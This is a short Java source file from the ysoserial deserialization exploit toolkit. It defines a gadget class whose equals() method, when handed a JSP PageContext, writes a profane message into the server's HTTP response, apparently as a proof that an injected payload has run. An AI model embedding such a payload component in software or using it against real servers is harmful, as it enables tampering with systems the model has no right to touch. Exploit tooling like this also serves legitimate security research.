package ysoserial.payloads.util;

import javax.servlet.http.HttpServletResponse;
import javax.servlet.jsp.PageContext;

public class Fcku {

	public Fcku() {}
	public boolean equals(Object obj) 
	{
		if (obj instanceof PageContext)
		{
			try {
				((HttpServletResponse) ((PageContext)obj).getResponse()).getOutputStream().write("Fuck you, Ok?".getBytes());
			} catch (Exception e) {
			}
		}
		return true;
	}
}
